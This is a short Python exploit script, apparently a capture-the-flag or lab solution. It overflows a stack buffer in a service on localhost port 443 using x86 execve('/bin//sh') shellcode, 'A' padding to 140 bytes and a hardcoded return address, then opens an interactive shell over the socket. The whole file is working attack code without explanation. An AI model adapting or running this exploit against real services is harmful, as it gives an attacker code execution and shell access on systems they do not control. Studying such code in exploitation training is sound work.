#!/usr/bin/python
# -*- coding:utf-8 -*-

import sys, socket, struct, telnetlib

import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((remoteip, remoteport))
	return s

def shell(s):
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]

ret_shellcode = 0xffffd660

shellcode = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

buf = shellcode
buf += "A" * (140 - len(shellcode))
buf += p(ret_shellcode)

s = sock("localhost", 443)
s.send(buf)

shell(s)
